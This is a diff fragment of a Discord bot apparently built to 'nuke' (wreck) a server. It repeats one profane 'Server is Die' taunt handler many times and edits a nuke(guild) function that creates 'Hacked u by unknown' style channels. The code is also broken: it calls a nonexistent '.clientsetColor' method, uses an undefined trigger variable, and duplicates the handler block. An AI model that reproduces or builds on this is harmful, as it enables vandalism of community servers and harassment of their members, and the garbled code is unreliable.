+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+
+
+
 // الكتابة لما يبدي التهكير 
 const { Client } = require('discord.js');
 const client = new Client();
@@ -545,9 +2580,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
+    await guild.createChannel('سوبرايز-فكرز', 'text');
  
-      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+      await guild.createChannel('سوبرايز فكرز', 'voice');
  
  
  
